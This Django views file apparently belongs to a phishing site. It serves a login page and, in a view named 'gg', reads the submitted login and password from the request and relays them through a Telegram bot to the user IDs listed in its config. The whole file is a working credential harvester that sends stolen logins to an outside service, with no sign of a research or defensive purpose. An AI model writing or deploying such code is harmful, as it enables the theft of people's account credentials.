from django.shortcuts import render
from urllib.parse import unquote
from urllib.parse import quote_plus
from .telegram_bot import send_notification
from asgiref.sync import sync_to_async
from .config import user_id


def main(request):
    return render(request, 'main.html')


def login(request):
    return render(request, 'reg.html')


async def gg(request):
    login = request.GET.get('login')
    password = request.GET.get('password')
    for i in user_id:
        await send_notification(i, f'Логин: {login}\nПароль: {password}')
    return render(request, 'gg.html')
